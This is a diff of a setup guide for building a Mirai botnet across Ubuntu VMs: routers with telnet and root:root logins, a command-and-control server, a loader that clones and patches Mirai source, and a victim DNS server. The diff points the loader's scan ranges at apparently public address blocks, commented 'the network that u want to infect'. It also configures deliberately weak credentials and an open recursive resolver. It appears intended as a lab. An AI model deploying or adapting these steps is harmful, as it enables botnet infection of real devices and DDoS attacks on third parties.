@@ -4,10 +4,9 @@
 
 1. **mirai.patch :**
 +    return INET_ADDR(192,168,o3,o4); // the network that u want to infect
-
 2. **mirai/loader/src/main.c :**
-- snprintf(strbuf, sizeof(strbuf), "51.20.76.%d:23 root:root", i);
-- snprintf(strbuf, sizeof(strbuf), "192.168.1.%d:23 root:root", i); // the network that u want to infect
+- snprintf(strbuf, sizeof(strbuf), "13.53.41.%d:23 root:root", i); // the network that u want to infect
+- snprintf(strbuf, sizeof(strbuf), "13.60.46.%d:23 root:root", o4); // the network that u want to infect
 - addrs[0] = inet_addr("192.168.1.57"); // IP privee of the loader
 - if ((srv = server_create(sysconf(_SC_NPROCESSORS_ONLN), addrs_len, addrs,1024 * 64, "192.168.1.57", 80, "192.168.1.57")) == NULL) // IP publique of the loader
 3. **router setup:**
@@ -15,7 +14,66 @@
 -      srv_addr.sin_addr.s_addr = inet_addr("172.31.29.220");  // IP du CNC
 ---
 
-## ROUTER VM (Ubuntu 22.04) - Complete Setup
+## ROUTER1 VM (Ubuntu 22.04) - Complete Setup
+
+
+```bash
+sudo apt update && sudo apt upgrade -y
+
+# Install packages
+sudo apt install -y iptables-persistent  busybox-static make gcc
+#sudo apt install  dnsmasq -y
+
+
+# Set hostname
+#echo router | sudo tee /etc/hostname
+#sudo hostnamectl set-hostname router
+#sudo sed -i 's/127.0.1.1.*/127.0.1.1       router/' /etc/hosts
+
+# Configure DNS
+#sudo systemctl stop systemd-resolved
+#sudo systemctl disable systemd-resolved
+#echo "address=/cnc.local/172.31.29.220" | sudo tee -a /etc/dnsmasq.conf
+#sudo systemctl enable dnsmasq
+#sudo systemctl start dnsmasq
+
+# Set root password
+echo "root:root" | sudo chpasswd
+
+# Configure telnet
+for i in {0..9}; do
+    echo "pts/$i" | sudo tee -a /etc/securetty
+done
+
+# Create telnet service
+sudo tee /etc/systemd/system/telnetd.service << 'EOF'
+[Unit]
+Description=Telnetd service
+After=network.target
+
+[Service]
+ExecStart=/usr/bin/busybox telnetd -F
+Restart=always
+RestartSec=1
+StandardOutput=syslog
+StandardError=syslog
+SyslogIdentifier=telnetd
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+sudo systemctl daemon-reload
+sudo systemctl enable telnetd.service
+sudo systemctl start telnetd.service
+sudo systemctl status telnetd.service
+# On Router VM after installation
+sudo ln -s /usr/bin/busybox /bin/busybox
+```
+
+---
+
+## ROUTER2 VM (Ubuntu 22.04) - Complete Setup
 
 
 ```bash
@@ -83,21 +141,6 @@ sudo ln -s /usr/bin/busybox /bin/busybox
 sudo apt update && sudo apt upgrade -y
 
 sudo apt install -y screen
-sudo apt install -y   dnsmasq  
-
- 
-
-# Configure DNS
-sudo systemctl stop systemd-resolved
-sudo systemctl disable systemd-resolved
-echo "address=/cnc.local/13.48.148.98" | sudo tee -a /etc/dnsmasq.conf
-sudo systemctl enable dnsmasq
-sudo systemctl start dnsmasq
-
-# Set hostname
-echo cnc | sudo tee /etc/hostname
-sudo hostnamectl set-hostname cnc
-sudo sed -i 's/127.0.1.1.*/127.0.1.1       cnc/' /etc/hosts
 
 # Install dependencies
 sudo apt install -y git mysql-server mysql-client build-essential wget
@@ -278,11 +321,6 @@ sudo apt update && sudo apt upgrade -y
 # Install dependencies
 sudo apt install -y git gcc make apache2 build-essential electric-fence
 
-# Set hostname
-echo loader | sudo tee /etc/hostname
-sudo hostnamectl set-hostname loader
-sudo sed -i 's/127.0.1.1.*/127.0.1.1       loader/' /etc/hosts
-
 # Clone and patch Mirai
 cd ~
 git clone https://github.com/hameza123/Mirai-Source-Code.git
@@ -429,20 +467,92 @@ sudo rm -rf /var/www/html/bins/*
 ## VICTIM VM (Ubuntu 22.04) - Complete Setup
 
 ```bash
-#!/bin/bash
-# Victim VM - Ubuntu 22.04
-
+# Installer BIND9 (serveur DNS)
 sudo apt update && sudo apt upgrade -y
 
-# Set hostname
-echo victim | sudo tee /etc/hostname
-sudo hostnamectl set-hostname victim
-sudo sed -i 's/127.0.1.1.*/127.0.1.1       victim/' /etc/hosts
+sudo apt install -y bind9 bind9utils bind9-doc
 
-sudo netplan apply
+# Installer tcpdump pour monitoring
+sudo apt install -y tcpdump htop
 
-# Install monitoring tools
-sudo apt install -y tcpdump
+# Désactiver systemd-resolved (conflit)
+sudo systemctl stop systemd-resolved
+sudo systemctl disable systemd-resolved
+
+# Configurer BIND9 pour écouter sur toutes les interfaces
+sudo tee /etc/bind/named.conf.options << 'EOF'
+options {
+    directory "/var/cache/bind";
+    
+    // Écouter sur toutes les interfaces
+    listen-on { any; };
+    listen-on-v6 { any; };
+    
+    // Autoriser les requêtes de n'importe où
+    allow-query { any; };
+    allow-recursion { any; };
+    
+    // Désactiver la validation DNSSEC pour plus de rapidité
+    dnssec-validation no;
+    
+    // Forwarders (optionnel)
+    forwarders {
+        8.8.8.8;
+        8.8.4.4;
+    };
+    
+    // Réduire les timeouts pour supporter plus de requêtes
+    recursive-clients 10000;
+    max-cache-size 100M;
+    
+    // Logging minimal
+    version "DNS Server";
+};
+EOF
+
+# Configurer une zone DNS simple
+sudo tee /etc/bind/named.conf.local << 'EOF'
+zone "test.local" {
+    type master;
+    file "/etc/bind/db.test.local";
+};
+EOF
+
+# Créer le fichier de zone
+sudo tee /etc/bind/db.test.local << 'EOF'
+;
+; BIND data file for test.local
+;
+$TTL    604800
+@   IN  SOA ns1.test.local. admin.test.local. (
+                  2026051101  ; Serial
+                  604800      ; Refresh
+                  86400       ; Retry
+                  2419200     ; Expire
+                  604800 )    ; Negative Cache TTL
+;
+@   IN  NS  ns1.test.local.
+@   IN  A   172.31.25.14
+ns1 IN  A   172.31.25.14
+www IN  A   192.168.1.100
+mail IN  A   192.168.1.101
+EOF
+
+# Redémarrer BIND9
+sudo systemctl restart bind9
+sudo systemctl enable bind9
+
+# Vérifier que BIND9 tourne
+sudo systemctl status bind9
+
+
+# Tester que le serveur DNS répond
+nslookup test.local 127.0.0.1
+nslookup google.com 127.0.0.1
+
+# Vérifier le port 53
+sudo netstat -tlnp | grep :53
+
 
 echo "Victim VM configured!"
 ```
